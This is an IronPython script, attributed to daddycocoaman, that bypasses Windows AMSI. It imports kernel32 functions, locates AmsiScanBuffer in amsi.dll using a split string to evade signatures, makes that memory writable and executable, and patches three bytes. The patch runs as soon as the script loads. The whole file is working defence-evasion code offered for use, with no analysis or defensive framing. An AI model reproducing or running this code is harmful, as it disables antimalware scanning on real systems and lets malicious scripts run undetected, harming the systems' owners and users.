##################################################
## IronPython AMSI Bypass
##################################################
## Author: daddycocoaman
##################################################
## Reference: https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/
##################################################
import clrtype
import System
from System.Runtime.InteropServices import DllImportAttribute, PreserveSigAttribute, Marshal, HandleRef

class NativeMethods(object):
    __metaclass__ = clrtype.ClrClass
    DllImport = clrtype.attribute(DllImportAttribute)
    PreserveSig = clrtype.attribute(PreserveSigAttribute)

    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.UInt64, System.UInt64, System.UInt64)
    @clrtype.returns(System.IntPtr)
    def VirtualAlloc(lpStartAddr, size, flAllocationType, flProtect): raise NotImplementedError("No Virtual Alloc?")
    
    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.UInt32, System.UInt32, System.IntPtr)
    @clrtype.returns(System.Boolean)
    def VirtualProtect(lpAddr, dwSize, newProtect, oldProtect): raise NotImplementedError("No Virtual Protect?")
    
    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.IntPtr)
    @clrtype.returns(System.IntPtr)
    def GetProcAddress(hModule, procName): raise NotImplementedError("No ProcAddr?")
    
    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.String)
    @clrtype.returns(System.IntPtr)
    def LoadLibrary(lpFileName): raise NotImplementedError("No LoadLibrary?")
    
    @staticmethod
    @DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = False)
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.IntPtr, System.Int32)
    @clrtype.returns()
    def RtlMoveMemory(lpFileName): raise NotImplementedError("No RtlMoveMemory?")

    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts()
    @clrtype.returns(System.UInt64)
    def GetLastError(): raise NotImplementedError("No GetLastError?")

def bypass():
    asbSTR = Marshal.StringToHGlobalAnsi("Amsi" + "Scan" + "Buffer")
    asbHandle = NativeMethods.LoadLibrary("amsi.dll")
    asbPtr = NativeMethods.GetProcAddress(asbHandle, asbSTR)

    old = Marshal.AllocHGlobal(4)
    prot = NativeMethods.VirtualProtect(asbPtr, 0x0015, 0x40, old)

    patch = System.Array[System.Byte]((0x33, 0xff, 0x90))
    unPtr = Marshal.AllocHGlobal(3)
    Marshal.Copy(patch, 0, unPtr, 3)
    NativeMethods.RtlMoveMemory(asbPtr + 0x001b, unPtr, 3)

    Marshal.FreeHGlobal(old)
    Marshal.FreeHGlobal(unPtr)

bypass()